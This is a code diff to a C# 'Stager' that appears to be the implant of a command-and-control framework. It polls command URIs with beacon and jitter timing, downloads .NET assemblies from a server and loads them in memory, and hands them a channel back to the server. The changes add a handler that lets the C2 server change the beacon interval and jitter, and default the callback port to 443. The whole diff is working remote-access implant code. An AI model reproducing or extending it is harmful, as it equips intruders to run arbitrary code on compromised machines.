@@ -57,7 +57,7 @@ namespace Stager
                 }
             }
 #if DEBUG
-            Console.WriteLine("\nAdd URIs, now have the following URIs");
+            Console.WriteLine("\n[*] Add URIs, now have the following URIs");
             foreach(Uri u in commandUriList)
             {
                 Console.WriteLine(u.AbsoluteUri);
@@ -76,6 +76,7 @@ namespace Stager
         /// </returns>
         public int LoadStage(byte[] assembly, Dictionary<string, string> arguments)
         {
+            ClearChannel channel;
             Assembly s = Assembly.Load(assembly);
             foreach(var type in s.GetTypes())
             {
@@ -83,9 +84,13 @@ namespace Stager
                 {
                     Assembly a = Assembly.Load(assembly);
                     string server = arguments["server"];
-                    int port = Int32.Parse(arguments["port"]);
+                    int port = 443;
                     string compression = arguments["compression"];
-                    ClearChannel channel = new ClearChannel(server, port, compression);
+                    if (!Int32.TryParse(arguments["port"], out port))
+                    {
+                        Console.WriteLine("[-] Error parsing port argument, using default of 443");
+                    }
+                    channel = new ClearChannel(server, port, compression);
                     object[] p = new object[1];
                     p[0] = channel;
                     var terminalInstance = Activator.CreateInstance(type, p);
@@ -165,6 +170,42 @@ namespace Stager
             return 1;
         }
         /// <summary>
+        /// Changes the beacon duration based on the arguments received from the C2 server
+        /// </summary>
+        /// <param name="arguments">Arguments containing the beacon and jitter</param>
+        /// <returns>
+        /// 1 - if successfull
+        /// -1 - if failure
+        /// </returns>
+        public int ChangeBeacon(Dictionary<string, string> arguments)
+        {
+            int status = -1;
+
+            foreach(KeyValuePair<string, string> kv in arguments)
+            {
+                if (kv.Key.Equals("seconds"))
+                {
+                    if(!Int32.TryParse(kv.Value, out beacon))
+                    {
+#if DEBUG
+                        Console.WriteLine("[-] Failed to parse beacon");
+#endif
+                    }
+                }
+                else if (kv.Key.Equals("jitter"))
+                {
+                    if(!Int32.TryParse(kv.Value, out jitter))
+                    {
+#if DEBUG
+                        Console.WriteLine("[-] Failed to parse jitter");
+#endif
+                    }
+                }
+            }
+
+            return status;
+        }
+        /// <summary>
         /// This method removes a Uri from the command list
         /// </summary>
         /// <param name="removeUris">The list of URIs to remove. The list is & delimited</param>
@@ -183,7 +224,7 @@ namespace Stager
                 }
             }
 #if DEBUG
-            Console.WriteLine("\nRemoved URIs called, now have the following URIs");
+            Console.WriteLine("\n[*] Removed URIs called, now have the following URIs");
             foreach (Uri u in commandUriList)
             {
                 Console.WriteLine(u.AbsoluteUri);
@@ -283,7 +324,6 @@ namespace Stager
 #endif
                     assembly = new byte[contentLength];
                     assembly = await response.Content.ReadAsByteArrayAsync();
-
                 }
             }
             catch (HttpRequestException e)
@@ -293,7 +333,7 @@ namespace Stager
             return assembly;
         }
 
-        public async void Run()
+        public void Run()
         {
             while (true)
             {
@@ -313,6 +353,7 @@ namespace Stager
                 if (trueJitter > beacon)    // Make sure jitter won't make beacon less than 0
                     trueJitter = 0;
 #if DEBUG
+                Console.WriteLine("[*] Beacon: {0} \tJitter {1}", beacon, jitter);
                 Console.WriteLine("[*] Beacon time: {0} \tJitter time {1}\tAdd: {2}", beacon, trueJitter, add);       
 #endif
                 if (add)    // Now sleep
@@ -334,7 +375,7 @@ namespace Stager
                     commandUriList.Add(tmp);
                 }
 #if DEBUG
-                Console.WriteLine("Command: " + result.Command + "\t" + result.FullCommandString);
+                Console.WriteLine("[*] Command: " + result.Command + "\t" + result.FullCommandString);
 #endif
                 if(result != null)
                 {
@@ -346,6 +387,7 @@ namespace Stager
                             break;
                         case Command.Beacon:
                             Console.WriteLine("[*] Beacon Command");
+                            ChangeBeacon(result.Arguments);
                             break;
                         case Command.Load:
                             Console.WriteLine("[*] Load Command");
